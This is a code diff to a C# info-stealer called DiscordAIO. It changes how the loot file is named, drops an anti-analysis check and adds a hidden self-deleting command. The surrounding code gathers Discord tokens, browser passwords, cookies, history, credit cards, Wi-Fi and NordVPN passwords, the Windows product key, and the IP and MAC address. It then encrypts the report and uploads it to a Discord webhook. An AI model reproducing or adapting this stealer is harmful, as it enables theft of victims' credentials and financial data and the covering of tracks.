@@ -37,6 +37,10 @@ using System.Xml;
 
 namespace DiscordAIO
 {
+	public class hisName 
+	{
+		public static string howtonameit = "";
+	}
 	public class DiscordAIO : IDisposable
 	{
 
@@ -466,13 +470,13 @@ namespace DiscordAIO
 				{
 					Directory.CreateDirectory(Stealer_Dir);
 
-					File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "Discord AIO report / Made by dv0l \n\n");
-					File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "# Tokens \n\n");
+					File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\nDiscord AIO report / Made by dv0l \n\n");
+					File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "# Tokens \n\n");
 
 					foreach (string token in lcDicordTokens)
-						File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", token + "\n");
+						File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, token + "\n");
 
-					File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Tokens \n");
+					File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Tokens \n");
 
 				}
 				CopyLevelDb();
@@ -648,9 +652,9 @@ namespace DiscordAIO
 			bool success = bool.Parse(obj["success"].ToString());
 			link = obj["data"]["link"].ToString();
 
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\n# Pictures \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\npicURL: " + link + " | \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\n# End of Pictures \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Pictures \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\npicURL: " + link + " | \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Pictures \n");
 		}
 
 		public static void Piccc()
@@ -2246,12 +2250,12 @@ namespace DiscordAIO
 						string Stealer_Dir = Handler.ExploitDir;
 						if (pPasswords.Count > 0)
 						{
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# Passwords \n\n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Passwords \n\n");
 
 							foreach (Password pass in pPasswords)
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", FormatPassword(pass) + "\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatPassword(pass) + "\n");
 
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Passwords \n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Passwords \n");
 
 						}
 					}
@@ -2276,12 +2280,12 @@ namespace DiscordAIO
 						string Stealer_Dir = Handler.ExploitDir;
 						if (pHistory.Count > 0)
 						{
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# History \n\n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# History \n\n");
 
 							foreach (Site his in pHistory)
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", FormatHistory(his) + "\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatHistory(his) + "\n");
 
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of History \n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of History \n");
 
 						}
 					}
@@ -2307,12 +2311,12 @@ namespace DiscordAIO
 						string Stealer_Dir = Handler.ExploitDir;
 						if (pCreditCards.Count > 0)
 						{
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# Credit Cards \n\n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Credit Cards \n\n");
 
 							foreach (CreditCard cc in pCreditCards)
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", FormatCreditCard(cc) + "\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatCreditCard(cc) + "\n");
 
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Credit Cards \n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Credit Cards \n");
 
 						}
 					}
@@ -2338,12 +2342,12 @@ namespace DiscordAIO
 						string Stealer_Dir = Handler.ExploitDir;
 						if (pCookies.Count > 0)
 						{
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# Cookies \n\n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Cookies \n\n");
 
 							foreach (Cookie cookie in pCookies)
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", FormatCookie(cookie) + "\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, FormatCookie(cookie) + "\n");
 
-							File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Cookies \n");
+							File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Cookies \n");
 
 						}
 					}
@@ -2532,9 +2536,9 @@ namespace DiscordAIO
 		{
 			string Stealer_Dir = Handler.ExploitDir;
 			string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");
-			File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# Wifi Network \n\n");
-			File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", output + "\n");
-			File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Wifi Network\n");
+			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Wifi Network \n\n");
+			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, output + "\n");
+			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Wifi Network\n");
 		}
 
 		public static void SavedNetworks()
@@ -2550,9 +2554,9 @@ namespace DiscordAIO
 				string pwd = GetPassword(profile);
 				string fmt = "PROFILE: " + profile + "\nPASSWORD: " + pwd + "\n\n";
 
-				File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# Wifi Password \n\n");
-				File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", fmt + "\n");
-				File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Wifi Password\n");
+				File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Wifi Password \n\n");
+				File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, fmt + "\n");
+				File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Wifi Password\n");
 			}
 		}
 
@@ -2604,9 +2608,9 @@ namespace DiscordAIO
 
 								Counter.VPN++;
 								string Stealer_Dir = Handler.ExploitDir;
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# NordVPN \n\n");
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "NordVPN\nUsername: " + username + "\nPassword: " + password + "\n\n");
-								File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of NordVPN\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# NordVPN \n\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "NordVPN\nUsername: " + username + "\nPassword: " + password + "\n\n");
+								File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of NordVPN\n");
 							}
 
 
@@ -2777,17 +2781,16 @@ namespace DiscordAIO
 		public static void WinProductKey()
         {
 			string Stealer_Dir = Handler.ExploitDir;
-			File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# Windows Key \n\n");
-			File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "Win Key: " + ProductKey.GetWindowsProductKeyFromRegistry() + " | \n");
-			File.AppendAllText(Stealer_Dir + "\\Credentials.dAIO", "\n# End of Win Key \n");
+			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# Windows Key \n\n");
+			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "Win Key: " + ProductKey.GetWindowsProductKeyFromRegistry() + " | \n");
+			File.AppendAllText(Stealer_Dir + "\\" + hisName.howtonameit, "\n# End of Win Key \n");
         }
 
 		private static void Main(string[] args)
 		{
-			if (AntiAnalysis.Run())
-			{
-				KYS();
-			}
+
+			string filenameSpacer = Environment.UserName;
+			hisName.howtonameit = filenameSpacer + ".dAIO";
 
 			WebClient webClient = new WebClient();
 			string ip = webClient.DownloadString("http://ipv4bot.whatismyipaddress.com/");
@@ -2801,14 +2804,14 @@ namespace DiscordAIO
 			var macAddr = (from nic in NetworkInterface.GetAllNetworkInterfaces() where nic.OperationalStatus == OperationalStatus.Up select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
 			string macString = macAddr.ToString();
 
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\n# Main informations \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\nDesktop name: " + Environment.UserName + " | \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "IP Address: " + ip + " | \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\n# End of Main informations \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Main informations \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nDesktop name: " + Environment.UserName + " | \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "IP Address: " + ip + " | \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Main informations \n");
 
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\n# Additional informations \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\nMAC Address: " + macString + " | \n");
-			File.AppendAllText(Handler.ExploitDir + "\\Credentials.dAIO", "\n# End of Additional informations \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# Additional informations \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\nMAC Address: " + macString + " | \n");
+			File.AppendAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, "\n# End of Additional informations \n");
 
 			//stealpasses
 			//stealcookies
@@ -2825,30 +2828,25 @@ namespace DiscordAIO
 
 			//takepic
 
-			string textDAIO = File.ReadAllText(Handler.ExploitDir + "\\Credentials.dAIO");
+			string textDAIO = File.ReadAllText(Handler.ExploitDir + "\\" + hisName.howtonameit);
 			string encryption = Cipher.Encrypt(textDAIO);
 			textDAIO = textDAIO.Replace(textDAIO, encryption);
-			File.WriteAllText(Handler.ExploitDir + "\\Credentials.dAIO", textDAIO);
+			File.WriteAllText(Handler.ExploitDir + "\\" + hisName.howtonameit, textDAIO);
 
 			string mssgBody =
-				"\n ! NEW REPORT !" +
-				"\n" +
-				"\n Main Information" +
+				"\n **New Discord AIO report**" +
 				"\n" +
 				"\n Username: " + Environment.UserName +
 				"\n PC name: " + Environment.MachineName +
-				"\n IP: " + ip +
-				"\n ================================";
+				"\n IP: " + ip;
 
-			string filenameSpacer = Environment.UserName;
-			string filename = filenameSpacer  + ".dAIO";
 			string fileformat = "dAIO";
-			string filepath = Handler.ExploitDir + "\\filename";
+			string filepath = Handler.ExploitDir + "\\" + hisName.howtonameit;
 			string application = "";
 
 			try
 			{
-				DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application);
+				DiscordWebhook.SendFile(mssgBody, hisName.howtonameit, fileformat, filepath, application);
 			}
 			catch
 			{
@@ -2869,8 +2867,12 @@ namespace DiscordAIO
 
 		static void KYS()
 		{
-			Thread.Sleep(15000);
-			Directory.Delete(Handler.ExploitDir + "\\", true);
+			Thread.Sleep(5000);
+			Process.Start( new ProcessStartInfo()
+			{
+				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath +"\"",
+				WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, FileName = "cmd.exe"
+			});
 			Environment.Exit(0);
 		}
 	}
